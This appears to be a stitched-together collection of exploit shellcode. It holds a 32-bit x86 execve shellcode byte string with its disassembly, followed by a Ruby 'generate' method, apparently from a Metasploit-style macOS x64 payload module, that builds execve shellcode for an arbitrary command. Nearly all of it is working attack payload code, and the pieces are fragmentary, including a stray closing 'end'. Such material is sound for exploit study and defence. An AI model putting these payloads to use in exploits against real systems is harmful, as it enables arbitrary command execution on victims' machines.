"\x31\xc0\xe8\x05\x00\x00\x00\x68\x65\x6c\x6c\x00\x5b\x50\x50\x53\xb0\x3b\x50\xcd\x80"

#hell



00000000  31C0              xor eax,eax
00000002  E805000000        call dword 0xc
00000007  68656C6C00        push dword 0x6c6c65
0000000C  5B                pop ebx
0000000D  50                push eax
0000000E  50                push eax
0000000F  53                push ebx
00000010  B03B              mov al,0x3b
00000012  50                push eax
00000013  CD80              int 0x80


  def generate
    cmd_str = datastore['CMD'] || ''
    # Split the cmd string into arg chunks
    cmd_parts = Shellwords.shellsplit(cmd_str)
    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
    call = "\xe8" + [arg_str.length].pack('V')
    payload =
      "\x48\x31\xd2"+                                 # xor rdx, rdx
      call +                                          # call CMD.len
      arg_str  +                                      # CMD
      "\x5f" +                                        # pop rdi
      if cmd_parts.length > 1
        "\x48\x89\xf9" +                            # mov rcx, rdi
        "\x52" +                                    # push rdx (null)
        # for each arg, push its current memory location on to the stack
        cmd_parts[1..-1].each_with_index.map do |arg, idx|
          "\x48\x81\xc1" +                        # add rcx + ...
          [cmd_parts[idx].length+1].pack('V') +   #
          "\x51"                                  # push rcx (build str array)
        end.join
      else
        "\x52"                                      # push rdx (null)
      end +
      "\x57"+                                         # push rdi
      "\x48\x89\xe6"+	                                # mov rsi, rsp
      "\x48\xc7\xc0\x3b\x00\x00\x02" +                # mov rax, 0x200003b (execve)
      "\x0f\x05"                                      # syscall
  end
end